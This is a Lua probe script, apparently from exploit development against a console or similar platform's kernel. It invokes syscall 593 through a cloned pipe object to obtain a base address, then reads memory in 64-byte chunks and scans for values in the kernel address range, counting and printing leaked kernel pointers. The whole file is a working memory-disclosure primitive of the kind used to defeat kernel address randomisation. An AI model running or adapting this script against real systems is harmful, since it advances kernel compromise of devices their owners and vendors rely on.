-- CRASH_CLASS: LOW
-- PROBE 88h: Read kernel pointer region in 64-byte chunks

print("=== PROBE 88h ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

print("pid=" .. to_num(syscall.getpid()))

local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
make_syscall(593)(uint64(0x2001), uint64(info))
local data_lo = to_num(memory.read_dword(info + 0x118))
local data_hi = to_num(memory.read_dword(info + 0x11C))
print(string.format("base=0x%X%08X", data_hi, data_lo))

-- Read +0x3E00 to +0x4000 in 64-byte chunks, dump all non-zero dwords
for chunk = 0x3E00, 0x3FC0, 64 do
    local addr = uint64(string.format("0x%X%08X", data_hi, data_lo + chunk))
    local ok, data = pcall(native.read_buffer, addr, 64)
    if not ok or not data then
        print(string.format("FAIL +0x%X", chunk))
        break
    end
    for i = 1, #data - 3, 4 do
        local b1,b2,b3,b4 = data:byte(i,i+3)
        local val = b1+b2*256+b3*65536+b4*16777216
        if val ~= 0 then
            print(string.format("+0x%04X: 0x%08X", chunk+i-1, val))
        end
    end
end

-- Continue scanning for kernel pointers: +0x4000 to +0x6000
print("")
print("--- EXTEND SCAN ---")
local kcount = 0
for chunk = 0x4000, 0x5FC0, 64 do
    local addr = uint64(string.format("0x%X%08X", data_hi, data_lo + chunk))
    local ok, data = pcall(native.read_buffer, addr, 64)
    if not ok or not data then
        print(string.format("BREAK +0x%X", chunk))
        break
    end
    for i = 1, #data - 7, 8 do
        local b1,b2,b3,b4,b5,b6,b7,b8 = data:byte(i,i+7)
        local lo = b1+b2*256+b3*65536+b4*16777216
        local hi = b5+b6*256+b7*65536+b8*16777216
        if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
            kcount = kcount + 1
            if kcount <= 30 then
                print(string.format("K +0x%04X: 0x%08X%08X", chunk+i-1, hi, lo))
            end
        end
    end
end
print("ext_kptr=" .. kcount)

print("=== PROBE 88h COMPLETE ===")
